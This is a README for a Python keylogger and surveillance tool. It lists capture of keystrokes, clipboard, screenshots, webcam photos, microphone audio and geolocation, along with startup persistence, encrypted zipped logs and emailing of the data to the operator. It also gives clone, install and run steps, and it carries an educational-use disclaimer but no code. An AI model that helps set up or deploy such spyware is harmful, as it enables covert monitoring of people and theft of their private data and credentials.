# Ultimate Python Key Logger & Analyzer

![Banner](https://img.shields.io/badge/Status-Active-brightgreen) ![Python](https://img.shields.io/badge/Python-3.x-blue)

A comprehensive surveillance tool built for cybersecurity research. Capture data, compress it, email it, and analyze it with a custom dashboard.

## ⚠️ Disclaimer

**This tool is for educational purposes only.**
Unauthorized use of surveillance software is illegal. Ensure you have explicit permission from the device owner. The author is not responsible for any misuse.

## Features

- **Keystroke Logging**: Captures all keys pressed.
- **Active Window Logging**: Records the window title.
- **Clipboard Monitoring**: Logs copied text.
- **System Information**: Logs IP, Hostname, etc.
- **Geolocation**: Logs City, Country, ISP on startup.
- **Process Monitor**: Logs list of running processes on startup.
- **Multimedia Recording**:
  - **Screenshots**: Captures screen periodically.
  - **Webcam**: Takes photos from the webcam.
  - **Microphone**: Records short audio clips.
- **Encryption**: Logs are encrypted (AES/Fernet).
- **Compression**: Bundles all logs, images, and audio into a `logs.zip` file.
- **Persistence**: Automatically runs on system startup.
- **Reporting**:
  - **Email**: Sends the ZIP to your email.

## Prerequisites

- Python 3.x
- Windows OS

## Installation

1. Clone the repository:

    ```bash
    git clone https://github.com/joemunene-by/Key-logger.git
    cd Key-logger
    ```

2. Install dependencies:

    ```bash
    pip install -r requirements.txt
    ```

## Usage

### 1. Key Logger (`main.py`)

1. **Configuration**:
    Open `main.py` and set your credentials:
    - `email`: Your Gmail address.
    - `password`: Your App Password.

2. **Run**:

    ```bash
    python main.py
    ```

### 2. Log Analyzer (`log_analyzer.py`)

1. **Run**:

    ```bash
    python log_analyzer.py
    ```
